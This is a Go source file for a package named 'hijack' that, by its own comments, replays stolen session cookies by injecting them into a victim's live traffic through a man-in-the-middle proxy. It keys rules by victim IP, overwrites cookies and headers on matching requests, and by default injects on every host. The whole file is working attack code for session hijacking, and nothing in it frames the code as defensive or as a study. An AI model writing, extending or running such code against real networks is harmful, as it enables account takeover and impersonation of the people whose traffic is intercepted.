// Package hijack implements session/cookie theft replay: captured sessions
// can be replayed against targets and injected into a victim's live traffic
// by the MITM proxy.
package hijack

import (
	"sync"
)

// CookieInjection is a replay rule: requests from VictimIP to Host (empty =
// any host) get Cookies and Headers added/overridden by the proxy.
type CookieInjection struct {
	// VictimIP is the victim whose traffic is matched (e.g. a spoofed host).
	VictimIP string
	// Host filters the injection to one destination host; empty matches all.
	Host string
	// Cookies are the cookie name/value pairs to inject.
	Cookies map[string]string
	// Headers are the HTTP headers to inject.
	Headers map[string]string
}

// Injector holds the active injection rules.
type Injector struct {
	// mu guards rules so Add/Remove can run concurrently with the proxy
	// calling Apply on every request.
	mu sync.RWMutex
	// rules maps a victim IP to its injection rule.
	rules map[string]CookieInjection
}

// NewInjector returns an empty injector.
func NewInjector() *Injector {
	return &Injector{rules: make(map[string]CookieInjection)}
}

// Add installs (or replaces) the injection rule for a victim IP.
func (i *Injector) Add(rule CookieInjection) {
	i.mu.Lock()
	defer i.mu.Unlock()
	// Keying by VictimIP makes Replace a plain map assignment.
	i.rules[rule.VictimIP] = rule
}

// Remove deletes the rule for a victim IP.
func (i *Injector) Remove(victimIP string) {
	i.mu.Lock()
	defer i.mu.Unlock()
	delete(i.rules, victimIP)
}

// Rule returns the injection rule for a victim IP.
func (i *Injector) Rule(victimIP string) (CookieInjection, bool) {
	i.mu.RLock()
	defer i.mu.RUnlock()
	// The ok value reports whether a rule exists for this victim at all.
	r, ok := i.rules[victimIP]
	return r, ok
}

// Rules returns a snapshot of all injection rules.
func (i *Injector) Rules() []CookieInjection {
	i.mu.RLock()
	defer i.mu.RUnlock()
	// Pre-size the slice to avoid reallocation on every call.
	out := make([]CookieInjection, 0, len(i.rules))
	for _, r := range i.rules {
		out = append(out, r)
	}
	return out
}

// Apply mutates an outgoing request in place if an injection rule matches the
// victim IP and host filter. It is safe to call from the proxy on every
// request.
func (i *Injector) Apply(victimIP, host string, setCookie func(name, value string), setHeader func(k, v string)) {
	r, ok := i.Rule(victimIP)
	if !ok {
		// No rule for this victim: leave the request untouched.
		return
	}
	// A non-empty Host narrows the rule to one destination; an empty Host
	// matches every host, which is the default "inject everywhere" mode.
	if r.Host != "" && r.Host != host {
		return
	}
	// Overwrite semantics: injected values replace, not merge with, any
	// existing cookie/header of the same name on the outgoing request.
	for k, v := range r.Cookies {
		setCookie(k, v)
	}
	for k, v := range r.Headers {
		setHeader(k, v)
	}
}
